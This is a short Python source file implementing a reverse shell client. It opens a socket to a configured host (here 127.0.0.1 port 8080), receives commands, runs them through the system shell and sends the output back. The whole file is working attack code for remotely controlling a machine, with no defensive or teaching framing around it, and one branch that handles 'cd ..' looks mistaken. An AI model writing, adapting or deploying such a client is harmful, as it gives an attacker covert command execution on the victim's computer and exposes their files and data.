import socket
import subprocess
import os


class Client:
    def __init__(self):
        self.client = None
        self.quit_list = ['exit', 'quit', 'close']
        self.host = '127.0.0.1'
        self.port = 8080

    
    def connect(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.host, self.port))

    
    def shell(self):
        self.connect()
        while True:
            try:
                command = self.client.recv(1024).decode('utf-8')
                if command in self.quit_list:
                    break
                elif command[:3] == 'cd ':
                    os.chdir(command[3:])
                elif command[3:] == '..':
                    os.system(command)
                else:
                    output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, text=True)
                    self.client.send(output.encode('utf-8'))
            except Exception as e:
                error_msg = f'[Client] Error: {e}'
                self.client.send(error_msg.encode('utf-8'))
        self.client.close()


    def main(self):
        self.shell()


if __name__ == "__main__":
    client = Client()
    client.main()

